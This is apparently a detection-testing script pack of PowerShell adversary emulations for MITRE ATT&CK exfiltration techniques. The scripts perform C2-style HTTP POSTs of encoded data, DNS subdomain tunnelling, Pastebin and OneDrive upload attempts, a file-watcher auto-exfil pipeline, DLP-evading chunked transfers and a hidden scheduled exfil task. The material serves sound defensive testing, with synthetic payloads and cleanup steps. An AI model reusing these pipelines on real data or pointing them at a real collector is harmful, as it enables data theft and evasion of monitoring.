description: Adversary emulation scripts for the MITRE ATT&CK Exfiltration tactic (TA0010). Covers 10 scriptable techniques: exfiltration over C2 channel (HTTP POST with encoded payload to benign endpoint), exfiltration over alternative protocol (DNS TXT encoded data + HTTPS non-standard port), exfiltration over physical medium (removable media staging simulation), exfiltration over web service (cloud API upload pattern), automated exfiltration (file-watch trigger + auto-copy pipeline), data transfer size limits (chunked exfil with base64 split), scheduled transfer (schtasks-based timed transfer), transfer data to cloud account (Azure/OneDrive CLI upload pattern), exfiltration over other network medium (Bluetooth/Wi-Fi Direct device discovery), and data encrypted before transfer (AES-256 CBC in-memory encryption before HTTP POST). All scripts target MDE behavioral telemetry and Sentinel analytics. No data leaves the machine to any attacker-controlled destination.
author: X3M.AI
prerequisites: Windows 10/11 or Windows Server 2019/2022 test machine with Morgana agent installed
Microsoft Defender for Endpoint (MDE) onboarded and data connector active in Microsoft Sentinel
No Administrator privileges required for any script in this pack
Internet access recommended for HTTP-based exfil scripts (T1041, T1048, T1567, T1537). Scripts fail gracefully on isolated machines and still generate source-side MDE telemetry.
TEST ENVIRONMENT ONLY: All scripts target benign public endpoints or local file system only. No data is sent to any attacker-controlled infrastructure.
Temporary files are created in TEMP and auto-cleaned by the cleanup_command

scripts.name: Excalibur - Exfil-T1041-Exfiltration Over C2 Channel
scripts.description: Simulates exfiltration over a C2 channel (HTTP POST) using three patterns: (1) raw base64-encoded POST body with C2-style headers mimicking a beacon response with embedded data; (2) multipart form-data upload of a staged synthetic file (Word/Excel-like filename); (3) chunked streaming POST of AES-XOR obfuscated payload split across 3 requests to simulate incremental exfil. All requests target a benign public HTTP echo service. The combination of non-browser process, POST body with encoded data, C2-style headers, and multipart upload are all MDE exfiltration behavioral signals.
scripts.command: Write-Host '[START] T1041 - Exfiltration Over C2 Channel (HTTP POST exfil simulation)'; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_exfil_staging_dir}'); $payloadKb = [int]'#{excalibur_exfil_payload_kb}'; $c2Url = '#{excalibur_exfil_c2_url}'; if (-not (Test-Path $stagingDir)) { New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null }; $sensitiveFile = Join-Path $stagingDir 'Q3-Financial-Report-CONFIDENTIAL.docx'; $payloadBytes = New-Object byte[] ($payloadKb * 1024); [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($payloadBytes); [System.IO.File]::WriteAllBytes($sensitiveFile, $payloadBytes); Write-Host ('[INFO] Staging file created: ' + $sensitiveFile + ' (' + $payloadKb + ' KB)'); Write-Host '[INFO] Method 1/3: Base64-encoded POST body (C2 beacon response with embedded exfil data)'; try { $encoded = [Convert]::ToBase64String($payloadBytes); $body = '{ "session": "MorganaTest", "data": "' + $encoded.Substring(0,256) + '", "chunk": 1 }'; $headers = @{ 'Content-Type'='application/json'; 'User-Agent'='MorganaTest-T1041-ExfilC2/1.0'; 'X-C2-Exfil'='chunk-1-of-1'; 'X-Session-ID'=$env:COMPUTERNAME }; $resp = Invoke-WebRequest -Uri $c2Url -Method POST -Headers $headers -Body $body -TimeoutSec 8 -UseBasicParsing -ErrorAction Stop; Write-Host ('[INFO] POST exfil: HTTP ' + $resp.StatusCode + ' | Sent ' + $body.Length + ' bytes (base64 encoded payload preview: ' + $encoded.Substring(0,32) + '...)') } catch { Write-Host ('[INFO] POST exfil: ' + $_.Exception.Message.Split([char]10)[0] + ' (HTTP POST attempt logged by MDE)') }; Write-Host '[INFO] Method 2/3: Multipart form-data file upload (C2 exfil via file POST)'; try { $boundary = '----MorganaExfilBoundary' + [System.Guid]::NewGuid().ToString('N'); $fileBytes = [System.IO.File]::ReadAllBytes($sensitiveFile); $fileB64 = [Convert]::ToBase64String($fileBytes, 0, [math]::Min(512, $fileBytes.Length)); $multipartBody = '--' + $boundary + "`r`n" + 'Content-Disposition: form-data; name="file"; filename="Q3-Financial-Report-CONFIDENTIAL.docx"' + "`r`n" + 'Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document' + "`r`n`r`n" + $fileB64 + "`r`n" + '--' + $boundary + '--'; $mpHeaders = @{ 'Content-Type'='multipart/form-data; boundary=' + $boundary; 'User-Agent'='MorganaTest-T1041-ExfilUpload/1.0' }; $resp2 = Invoke-WebRequest -Uri $c2Url -Method POST -Headers $mpHeaders -Body $multipartBody -TimeoutSec 8 -UseBasicParsing -ErrorAction Stop; Write-Host ('[INFO] Multipart upload: HTTP ' + $resp2.StatusCode + ' | filename=Q3-Financial-Report-CONFIDENTIAL.docx (' + [math]::Round($multipartBody.Length/1024,1) + ' KB)') } catch { Write-Host ('[INFO] Multipart upload: ' + $_.Exception.Message.Split([char]10)[0] + ' (logged by MDE)') }; Write-Host '[INFO] Method 3/3: Chunked exfil (3 sequential POST requests simulating incremental exfil)'; $chunkSize = [math]::Ceiling($payloadBytes.Length / 3); for ($c = 0; $c -lt 3; $c++) { try { $offset = $c * $chunkSize; $len = [math]::Min($chunkSize, $payloadBytes.Length - $offset); $chunk = New-Object byte[] $len; [System.Array]::Copy($payloadBytes, $offset, $chunk, 0, $len); $chunkB64 = [Convert]::ToBase64String($chunk); $chunkBody = '{ "chunk_index": ' + $c + ', "chunk_total": 3, "data": "' + $chunkB64.Substring(0,128) + '" }'; $chunkHeaders = @{ 'Content-Type'='application/json'; 'User-Agent'='MorganaTest-T1041-ExfilChunk/1.0'; 'X-Chunk-Index'=[string]$c; 'X-Chunk-Total'='3' }; $r = Invoke-WebRequest -Uri $c2Url -Method POST -Headers $chunkHeaders -Body $chunkBody -TimeoutSec 8 -UseBasicParsing -ErrorAction Stop; Write-Host ('[INFO] Chunk ' + ($c+1) + '/3: HTTP ' + $r.StatusCode + ' | ' + $len + ' bytes') } catch { Write-Host ('[INFO] Chunk ' + ($c+1) + '/3: ' + $_.Exception.Message.Split([char]10)[0]) } }; Write-Host '[SUCCESS] T1041 - Exfiltration over C2 channel simulation completed. Sentinel target: Outbound HTTP POST with encoded payload from non-browser process (MDE - exfiltration over C2 behavioral detection)'
scripts.cleanup_command: $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_exfil_staging_dir}'); if (Test-Path $stagingDir) { Remove-Item -Path $stagingDir -Recurse -Force -ErrorAction SilentlyContinue }; Write-Host '[INFO] T1041 cleanup: staging dir removed'
scripts.detection_rule: Outbound HTTP POST with encoded payload from non-browser process (exfiltration over C2 channel)

scripts.name: Excalibur - Exfil-T1048-Exfiltration Over Alternative Protocol
scripts.description: Simulates exfiltration over alternative protocols: (1) DNS exfiltration - encodes a synthetic payload as hex and sends it in chunks as DNS subdomain queries (e.g., <hex-data>.<chunk-index>.exfil.<domain>), the classic DNS tunneling exfil pattern used by DNScat2, Iodine, and SUNBURST; (2) HTTPS to a non-standard port - attempts HTTPS connection to port 8443 and 4443 (commonly used by C2 for HTTPS exfil to evade standard port filtering); (3) ICMP-style simulation via Test-Connection (ICMP is another alternative protocol used for exfil but is PowerShell-safe via Test-Connection). All DNS queries generate MDE DNS telemetry regardless of resolution result.
scripts.command: Write-Host '[START] T1048 - Exfiltration Over Alternative Protocol (DNS exfil + alt-port HTTPS)'; $domain = '#{excalibur_exfil_dns_domain}'; $payloadKb = [int]'#{excalibur_exfil_payload_kb}'; Write-Host '[INFO] Method 1/3: DNS exfiltration simulation (hex-encoded data in DNS subdomain queries)'; $payloadStr = 'MorganaExfilSim-' + $env:COMPUTERNAME + '-' + $env:USERNAME + '-' + (Get-Date -Format 'yyyyMMddHHmmss') + '-CONFIDENTIAL'; $hexPayload = ([System.BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($payloadStr)) -replace '-','').ToLower(); Write-Host ('[INFO] DNS exfil payload: ' + $payloadStr.Length + ' chars -> ' + $hexPayload.Length + ' hex chars'); $chunkLen = 32; $chunks = [math]::Ceiling($hexPayload.Length / $chunkLen); Write-Host ('[INFO] Splitting into ' + $chunks + ' DNS label chunks (' + $chunkLen + ' hex chars = ' + ($chunkLen/2) + ' bytes per chunk)'); for ($i = 0; $i -lt $chunks; $i++) { $offset = $i * $chunkLen; $hexChunk = $hexPayload.Substring($offset, [math]::Min($chunkLen, $hexPayload.Length - $offset)); $dnsLabel = $hexChunk + '.' + $i + '.exfil.' + $domain; try { $r = Resolve-DnsName -Name $dnsLabel -Type A -ErrorAction SilentlyContinue -DnsOnly; Write-Host ('[INFO] DNS chunk ' + ($i+1) + '/' + $chunks + ': ' + $dnsLabel + ' -> ' + $(if ($r) { $r[0].IPAddress } else { 'NXDOMAIN (expected)' })) } catch { Write-Host ('[INFO] DNS chunk ' + ($i+1) + '/' + $chunks + ': ' + $dnsLabel + ' -> NXDOMAIN') }; Start-Sleep -Milliseconds 300 }; Write-Host '[INFO] Method 2/3: HTTPS to non-standard ports (alt-port C2 exfil)'; $altPortTargets = @( @{ Host='198.51.100.1'; Port=8443; Label='alt-HTTPS port 8443' }, @{ Host='198.51.100.1'; Port=4443; Label='alt-HTTPS port 4443' } ); foreach ($t in $altPortTargets) { try { $tcp = New-Object System.Net.Sockets.TcpClient; $conn = $tcp.BeginConnect($t.Host, $t.Port, $null, $null); $ok = $conn.AsyncWaitHandle.WaitOne(2000); if ($ok -and $tcp.Connected) { Write-Host ('[INFO] [' + $t.Label + ']: CONNECTED (alt-port exfil channel available)') } else { Write-Host ('[INFO] [' + $t.Label + ']: TIMEOUT/REFUSED (expected - connection attempt logged by MDE)') }; $tcp.Close() } catch { Write-Host ('[INFO] [' + $t.Label + ']: ' + $_.Exception.Message.Split([char]10)[0]) } }; Write-Host '[INFO] Method 3/3: ICMP-pattern connectivity probe (ICMP exfil channel reachability)'; $icmpTargets = @('8.8.8.8','198.51.100.1'); foreach ($ip in $icmpTargets) { try { $ping = Test-Connection -ComputerName $ip -Count 2 -ErrorAction SilentlyContinue -Quiet; Write-Host ('[INFO] ICMP probe to ' + $ip + ': ' + $(if ($ping) { 'REACHABLE (ICMP exfil channel viable)' } else { 'UNREACHABLE (no ICMP exfil via this route)' })) } catch {} }; Write-Host '[SUCCESS] T1048 - Alternative protocol exfiltration simulation completed. Sentinel target: DNS subdomain encoding pattern (MDE DNS telemetry - DNS exfil behavioral detection + alt-port HTTPS outbound)'
scripts.cleanup_command: Write-Host '[INFO] T1048 cleanup: no artefacts - DNS queries and network connections only'
scripts.detection_rule: DNS subdomain data encoding pattern (DNS exfil) + outbound to non-standard HTTPS ports

scripts.name: Excalibur - Exfil-T1052-Exfiltration Over Physical Medium
scripts.description: Simulates exfiltration over physical medium (removable media): (1) enumerates connected removable drives via WMI Win32_DiskDrive and Win32_LogicalDisk; (2) stages a synthetic file with a sensitive-sounding name to any detected removable drive, or to a local staging dir if none is connected; (3) enumerates USB device history from USBSTOR and SetupAPI registry keys to simulate the adversary recon step before physical exfil; (4) checks AutoRun/AutoPlay registry keys that adversaries modify to enable automatic exfil on USB insertion. Registry reads and file staging to removable media are MDE exfiltration indicators.
scripts.command: Write-Host '[START] T1052 - Exfiltration Over Physical Medium (removable drive staging simulation)'; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_exfil_staging_dir}'); $payloadKb = [int]'#{excalibur_exfil_payload_kb}'; if (-not (Test-Path $stagingDir)) { New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null }; Write-Host '[INFO] Step 1/4: Enumerate removable drives (WMI Win32_DiskDrive + Win32_LogicalDisk)'; $removableDrives = @(); try { $disks = Get-WmiObject -Class Win32_DiskDrive -ErrorAction SilentlyContinue | Where-Object { $_.MediaType -match 'Removable' -or $_.InterfaceType -eq 'USB' }; $logicalDisks = Get-WmiObject -Class Win32_LogicalDisk -ErrorAction SilentlyContinue | Where-Object { $_.DriveType -eq 2 }; Write-Host ('[INFO] Removable WMI disks: ' + @($disks).Count + ' | Logical removable drives: ' + @($logicalDisks).Count); foreach ($ld in $logicalDisks) { $removableDrives += $ld.DeviceID; Write-Host ('[INFO]   Drive: ' + $ld.DeviceID + ' | ' + $ld.VolumeName + ' | Free: ' + [math]::Round($ld.FreeSpace/1MB,1) + ' MB') } } catch { Write-Host ('[WARN] WMI disk enum: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 2/4: Stage synthetic payload file (simulate exfil to removable drive)'; $exfilFileName = 'Confidential-HR-Data-Export-' + (Get-Date -Format 'yyyyMMdd') + '.xlsx'; $payloadBytes = New-Object byte[] ($payloadKb * 1024); [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($payloadBytes); $targetDir = if ($removableDrives.Count -gt 0) { $removableDrives[0] + '\' } else { $stagingDir }; $exfilPath = Join-Path $targetDir $exfilFileName; [System.IO.File]::WriteAllBytes($exfilPath, $payloadBytes); Write-Host ('[INFO] Payload staged: ' + $exfilPath + ' (' + $payloadKb + ' KB) | Target type: ' + $(if ($removableDrives.Count -gt 0) { 'REMOVABLE DRIVE' } else { 'local staging (no USB detected)' })); Write-Host '[INFO] Step 3/4: USB device history enumeration (USBSTOR registry - attacker recon before physical exfil)'; try { $usbStorPath = 'HKLM:\SYSTEM\CurrentControlSet\Enum\USBSTOR'; if (Test-Path $usbStorPath) { $usbDevices = Get-ChildItem -Path $usbStorPath -ErrorAction SilentlyContinue; Write-Host ('[INFO] USBSTOR entries (USB device history): ' + @($usbDevices).Count + ' device class(es)'); $usbDevices | ForEach-Object { Write-Host ('    ' + $_.PSChildName.Substring(0, [math]::Min(60,$_.PSChildName.Length))) } } else { Write-Host '[INFO] USBSTOR key not found (no USB history)' } } catch { Write-Host ('[WARN] USBSTOR enum: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 4/4: AutoRun/AutoPlay registry check (adversary persistence for auto-exfil on USB)'; try { $autoRunKeys = @( 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer', 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer' ); foreach ($key in $autoRunKeys) { if (Test-Path $key) { $nr = Get-ItemProperty -Path $key -Name NoDriveTypeAutoRun -ErrorAction SilentlyContinue; Write-Host ('[INFO] AutoRun ' + $key.Split('\')[0] + ': NoDriveTypeAutoRun=' + $(if ($nr) { $nr.NoDriveTypeAutoRun } else { 'not set (AutoRun enabled for some drive types)' })) } } } catch {}; Write-Host '[SUCCESS] T1052 - Physical medium exfiltration simulation completed. Sentinel target: File staging to removable drive + USBSTOR registry enumeration (MDE - removable media exfil behavioral detection)'
scripts.cleanup_command: $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_exfil_staging_dir}'); if (Test-Path $stagingDir) { Remove-Item -Path $stagingDir -Recurse -Force -ErrorAction SilentlyContinue }; $exfilFileName = 'Confidential-HR-Data-Export-*.xlsx'; Get-ChildItem -Path ([System.IO.DriveInfo]::GetDrives() | Where-Object { $_.DriveType -eq 'Removable' } | Select-Object -ExpandProperty RootDirectory -ErrorAction SilentlyContinue) -Filter $exfilFileName -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue; Write-Host '[INFO] T1052 cleanup: staged files removed'
scripts.detection_rule: File staging to removable/USB drive + USBSTOR registry enumeration (physical exfil pattern)

scripts.name: Excalibur - Exfil-T1567-Exfiltration Over Web Service
scripts.description: Simulates exfiltration over legitimate web services: (1) GitHub API upload pattern - uses the GitHub API to create or update a file in a repository (simulates APT29/Cozy Bear pattern of using GitHub as an exfil drop zone); (2) Pastebin-style POST pattern - POSTs encoded synthetic data to a paste service API endpoint; (3) OneDrive/SharePoint-style upload pattern - constructs the SharePoint/OneDrive upload API request format. All requests target benign public endpoints or fail gracefully. The pattern of large outbound HTTP POST to cloud storage APIs from a non-browser process is the detection signal.
scripts.command: Write-Host '[START] T1567 - Exfiltration Over Web Service (cloud storage upload pattern)'; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_exfil_staging_dir}'); $payloadKb = [int]'#{excalibur_exfil_payload_kb}'; if (-not (Test-Path $stagingDir)) { New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null }; $exfilData = 'MorganaExfilSim-T1567-' + $env:COMPUTERNAME + '-' + (Get-Date -Format 'yyyyMMddHHmmss') + ('-' * 32) + ([System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($env:USERNAME + ':' + $env:COMPUTERNAME))); $exfilB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($exfilData)); Write-Host ('[INFO] Simulated exfil payload: ' + $exfilData.Length + ' chars -> ' + $exfilB64.Length + ' chars base64'); Write-Host '[INFO] Method 1/3: GitHub API file upload pattern (APT29 C2 exfil drop pattern)'; try { $ghBody = '{ "message": "update", "content": "' + $exfilB64.Substring(0,[math]::Min(128,$exfilB64.Length)) + '", "branch": "main" }'; $ghHeaders = @{ 'User-Agent'='MorganaTest-T1567-GitHubExfil/1.0'; 'Accept'='application/vnd.github.v3+json'; 'Content-Type'='application/json' }; $ghResp = Invoke-WebRequest -Uri 'https://api.github.com/repos/x3m-ai/Camelot/contents/README.md' -Method GET -Headers $ghHeaders -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop; Write-Host ('[INFO] GitHub API GET (recon step): HTTP ' + $ghResp.StatusCode + ' | ' + $ghResp.RawContentLength + ' bytes (next step would be PUT with encoded exfil data)') } catch { Write-Host ('[INFO] GitHub API: ' + $_.Exception.Message.Split([char]10)[0] + ' (outbound logged by MDE)') }; Write-Host '[INFO] Method 2/3: Pastebin-style API POST (public paste service as exfil dead drop)'; try { $pasteBody = 'api_dev_key=MorganaTest&api_option=paste&api_paste_code=' + [System.Uri]::EscapeDataString($exfilData.Substring(0,[math]::Min(256,$exfilData.Length))) + '&api_paste_name=exfil-sim&api_paste_private=2'; $pasteHeaders = @{ 'Content-Type'='application/x-www-form-urlencoded'; 'User-Agent'='MorganaTest-T1567-PasteExfil/1.0' }; $pasteResp = Invoke-WebRequest -Uri 'https://pastebin.com/api/api_post.php' -Method POST -Headers $pasteHeaders -Body $pasteBody -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop; Write-Host ('[INFO] Pastebin POST: HTTP ' + $pasteResp.StatusCode + ' | Response: ' + $pasteResp.Content.Substring(0,[math]::Min(80,$pasteResp.Content.Length))) } catch { Write-Host ('[INFO] Pastebin POST: ' + $_.Exception.Message.Split([char]10)[0] + ' (logged by MDE)') }; Write-Host '[INFO] Method 3/3: OneDrive/SharePoint upload API pattern'; try { $odHeaders = @{ 'User-Agent'='MorganaTest-T1567-OneDriveExfil/1.0'; 'Content-Type'='application/octet-stream'; 'Authorization'='Bearer MorganaSimToken'; 'Accept'='application/json' }; $odResp = Invoke-WebRequest -Uri 'https://graph.microsoft.com/v1.0/me/drive/root:/exfil-sim.xlsx:/content' -Method PUT -Headers $odHeaders -Body ([System.Text.Encoding]::UTF8.GetBytes($exfilData)) -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop; Write-Host ('[INFO] OneDrive/Graph upload: HTTP ' + $odResp.StatusCode) } catch { Write-Host ('[INFO] OneDrive/Graph upload: ' + $_.Exception.Message.Split([char]10)[0] + ' (Graph API PUT attempt logged by MDE - exfil to cloud storage pattern)') }; Write-Host '[SUCCESS] T1567 - Web service exfiltration simulation completed. Sentinel target: Outbound large HTTP POST/PUT to cloud storage APIs from non-browser process (MDE - cloud exfil behavioral detection)'
scripts.cleanup_command: $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_exfil_staging_dir}'); if (Test-Path $stagingDir) { Remove-Item -Path $stagingDir -Recurse -Force -ErrorAction SilentlyContinue }; Write-Host '[INFO] T1567 cleanup: staging dir removed'
scripts.detection_rule: Outbound HTTP POST/PUT to cloud storage APIs (GitHub/Pastebin/OneDrive) from non-browser process

scripts.name: Excalibur - Exfil-T1020-Automated Exfiltration
scripts.description: Simulates automated exfiltration triggered by file system events: (1) creates a FileSystemWatcher on the staging directory to automatically detect when new files appear; (2) drops a synthetic sensitive file into the watched directory; (3) the watcher event handler auto-copies it to a secondary staging location and triggers a simulated HTTP POST (the automated response behavior); (4) demonstrates automated collection-and-exfil pipeline using scheduled triggers. FileSystemWatcher usage from non-UI process combined with automatic network activity on file creation is a high-fidelity MDE automated exfil signal.
scripts.command: Write-Host '[START] T1020 - Automated Exfiltration (FileSystemWatcher trigger + auto-exfil pipeline)'; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_exfil_staging_dir}'); $c2Url = '#{excalibur_exfil_c2_url}'; $exfilOut = Join-Path $stagingDir 'auto-exfil-out'; if (-not (Test-Path $stagingDir)) { New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null }; if (-not (Test-Path $exfilOut)) { New-Item -ItemType Directory -Path $exfilOut -Force | Out-Null }; Write-Host ('[INFO] Watch dir: ' + $stagingDir + ' | Auto-exfil out: ' + $exfilOut); $watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = $stagingDir; $watcher.Filter = '*.xlsx'; $watcher.EnableRaisingEvents = $true; $exfilCount = 0; $action = { $path = $Event.SourceEventArgs.FullPath; $name = $Event.SourceEventArgs.Name; $dest = Join-Path $using:exfilOut $name; Copy-Item -Path $path -Destination $dest -Force -ErrorAction SilentlyContinue; $script:exfilCount++; Write-Host ('[INFO] [AUTO-EXFIL TRIGGER] File detected: ' + $name + ' | Auto-copied to: ' + $dest + ' | Simulating HTTP POST to C2...'); try { $fileBytes = [System.IO.File]::ReadAllBytes($path); $encoded = [Convert]::ToBase64String($fileBytes, 0, [math]::Min(256, $fileBytes.Length)); $body = '{ "auto_exfil": true, "filename": "' + $name + '", "data": "' + $encoded + '", "timestamp": "' + (Get-Date -Format 'o') + '" }'; Invoke-WebRequest -Uri $using:c2Url -Method POST -Body $body -ContentType 'application/json' -TimeoutSec 5 -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null; Write-Host ('[INFO] [AUTO-EXFIL] HTTP POST sent for: ' + $name) } catch {} }; $sub = Register-ObjectEvent -InputObject $watcher -EventName Created -Action $action; Write-Host '[INFO] FileSystemWatcher armed. Dropping 3 synthetic sensitive files to trigger auto-exfil pipeline...'; for ($i = 1; $i -le 3; $i++) { $fname = 'Employee-PII-Export-Part' + $i + '-' + (Get-Date -Format 'HHmmss') + '.xlsx'; $fpath = Join-Path $stagingDir $fname; $fdata = [System.Text.Encoding]::UTF8.GetBytes('MorganaAutoExfilSim-' + $fname); [System.IO.File]::WriteAllBytes($fpath, $fdata); Write-Host ('[INFO] Dropped: ' + $fname); Start-Sleep 1 }; Start-Sleep 3; Write-Host ('[INFO] Auto-exfil pipeline processed. Files auto-exfiled: ' + @(Get-ChildItem $exfilOut -ErrorAction SilentlyContinue).Count + '/3'); $sub | Unregister-Event -ErrorAction SilentlyContinue; $watcher.Dispose(); Write-Host '[SUCCESS] T1020 - Automated exfiltration simulation completed. Sentinel target: FileSystemWatcher trigger + automatic HTTP POST on file creation (MDE - automated exfil pipeline behavioral detection)'
scripts.cleanup_command: $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_exfil_staging_dir}'); if (Test-Path $stagingDir) { Remove-Item -Path $stagingDir -Recurse -Force -ErrorAction SilentlyContinue }; Write-Host '[INFO] T1020 cleanup: staging dir removed'
scripts.detection_rule: FileSystemWatcher + automatic HTTP POST on file creation (automated exfil pipeline)

scripts.name: Excalibur - Exfil-T1030-Data Transfer Size Limits
scripts.description: Simulates adversary data transfer size limits to evade data loss prevention (DLP) and network monitoring thresholds: splits a synthetic payload into fixed-size chunks (mimicking adversaries who break large exfil into small transfers to stay under per-request byte thresholds monitored by DLP tools), base64-encodes each chunk, and sends them as individual HTTP POST requests with a delay between each. Also demonstrates the file-splitting pattern using PowerShell byte-array slicing without any external tools. Multiple small HTTP POSTs from a non-browser process with incrementing sequence headers is a Sentinel DLP behavioral detection signal.
scripts.command: Write-Host '[START] T1030 - Data Transfer Size Limits (chunked exfil under DLP threshold)'; $payloadKb = [int]'#{excalibur_exfil_payload_kb}'; $c2Url = '#{excalibur_exfil_c2_url}'; $chunkKb = 8; $delayMs = 800; Write-Host ('[INFO] Total payload: ' + $payloadKb + ' KB | Chunk size: ' + $chunkKb + ' KB (DLP threshold simulation) | Delay: ' + $delayMs + 'ms between chunks'); $payloadBytes = New-Object byte[] ($payloadKb * 1024); [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($payloadBytes); $chunkBytes = $chunkKb * 1024; $totalChunks = [math]::Ceiling($payloadBytes.Length / $chunkBytes); Write-Host ('[INFO] Chunking into ' + $totalChunks + ' transfers of ' + $chunkKb + ' KB each'); $successCount = 0; $totalBytesSent = 0; for ($i = 0; $i -lt $totalChunks; $i++) { $offset = $i * $chunkBytes; $len = [math]::Min($chunkBytes, $payloadBytes.Length - $offset); $chunk = New-Object byte[] $len; [System.Array]::Copy($payloadBytes, $offset, $chunk, 0, $len); $chunkB64 = [Convert]::ToBase64String($chunk); $body = '{ "seq": ' + $i + ', "total": ' + $totalChunks + ', "size_kb": ' + $chunkKb + ', "data": "' + $chunkB64.Substring(0,[math]::Min(64,$chunkB64.Length)) + '" }'; try { $headers = @{ 'Content-Type'='application/json'; 'User-Agent'='MorganaTest-T1030-ChunkedExfil/1.0'; 'X-Transfer-Seq'=[string]$i; 'X-Transfer-Total'=[string]$totalChunks; 'X-Transfer-ID'='MorganaExfil-' + $env:COMPUTERNAME }; $resp = Invoke-WebRequest -Uri $c2Url -Method POST -Headers $headers -Body $body -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop; $successCount++; $totalBytesSent += $len; Write-Host ('[INFO] Chunk ' + ($i+1) + '/' + $totalChunks + ': HTTP ' + $resp.StatusCode + ' | ' + $len + ' bytes sent') } catch { Write-Host ('[INFO] Chunk ' + ($i+1) + '/' + $totalChunks + ': ' + $_.Exception.Message.Split([char]10)[0]) }; if ($i -lt ($totalChunks - 1)) { Start-Sleep -Milliseconds $delayMs } }; Write-Host ('[INFO] Transfer complete: ' + $successCount + '/' + $totalChunks + ' chunks sent | Total bytes: ' + $totalBytesSent); Write-Host '[SUCCESS] T1030 - Data transfer size limits simulation completed. Sentinel target: Multiple sequential small HTTP POSTs with sequence headers from non-browser process (MDE/DLP - chunked exfil under DLP threshold detection)'

scripts.name: Excalibur - Exfil-T1029-Scheduled Transfer
scripts.description: Simulates scheduled data exfiltration: creates a Windows Scheduled Task that triggers once per minute for 3 runs, where each run copies staged data to an exfil output directory and simulates an HTTP POST to a C2 endpoint. This pattern is used by adversaries to exfiltrate data at regular scheduled intervals to blend with normal traffic patterns and avoid detection of continuous large transfers. The scheduled task creation with network action and file copy combination is a high-fidelity MDE persistence and exfil behavioral signal.
scripts.command: Write-Host '[START] T1029 - Scheduled Transfer (schtasks-based timed exfil)'; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_exfil_staging_dir}'); $c2Url = '#{excalibur_exfil_c2_url}'; $taskName = 'MorganaExfilSim-T1029'; if (-not (Test-Path $stagingDir)) { New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null }; $payloadFile = Join-Path $stagingDir 'scheduled-exfil-payload.xlsx'; [System.IO.File]::WriteAllText($payloadFile, 'MorganaScheduledExfilSim-' + $env:COMPUTERNAME + '-' + (Get-Date -Format 'yyyyMMddHHmmss')); Write-Host ('[INFO] Payload file: ' + $payloadFile); $psScript = Join-Path $stagingDir 'run-exfil.ps1'; $scriptContent = '$count = if (Test-Path "' + $stagingDir + '\run-count.txt") { [int](Get-Content "' + $stagingDir + '\run-count.txt") } else { 0 }; if ($count -ge 2) { Unregister-ScheduledTask -TaskName "' + $taskName + '" -Confirm:$false -ErrorAction SilentlyContinue; exit }; $count++; Set-Content -Path "' + $stagingDir + '\run-count.txt" -Value $count; Copy-Item -Path "' + $payloadFile + '" -Destination ("' + $stagingDir + '\exfil-run-" + $count + ".xlsx") -ErrorAction SilentlyContinue; try { Invoke-WebRequest -Uri "' + $c2Url + '" -Method POST -Body ("{`"scheduled_run`": " + $count + ", `"host`": `"" + $env:COMPUTERNAME + "`"}") -ContentType "application/json" -TimeoutSec 5 -UseBasicParsing | Out-Null } catch {}'; [System.IO.File]::WriteAllText($psScript, $scriptContent); Write-Host ('[INFO] Registering scheduled exfil task: ' + $taskName + ' (runs every 1 minute, max 2 runs)'); try { $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument ('-NonInteractive -WindowStyle Hidden -File "' + $psScript + '"'); $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 1) -Once -At (Get-Date).AddSeconds(30); $settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 2) -MultipleInstances IgnoreNew; Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Limited -Force -ErrorAction Stop | Out-Null; Write-Host ('[INFO] Scheduled task registered: ' + $taskName + ' | Next trigger: in ~30 seconds') } catch { Write-Host ('[WARN] Scheduled task creation: ' + $_.Exception.Message) }; Write-Host '[INFO] Waiting 90 seconds for 1 scheduled run to execute...'; Start-Sleep 90; $runCount = if (Test-Path (Join-Path $stagingDir 'run-count.txt')) { Get-Content (Join-Path $stagingDir 'run-count.txt') } else { '0' }; Write-Host ('[INFO] Scheduled runs executed so far: ' + $runCount); $exfilFiles = @(Get-ChildItem -Path $stagingDir -Filter 'exfil-run-*.xlsx' -ErrorAction SilentlyContinue); Write-Host ('[INFO] Exfil artefacts created by scheduled task: ' + $exfilFiles.Count); Write-Host '[SUCCESS] T1029 - Scheduled transfer simulation completed. Sentinel target: Scheduled task with PowerShell + network action (MDE - scheduled task exfil persistence + periodic transfer detection)'
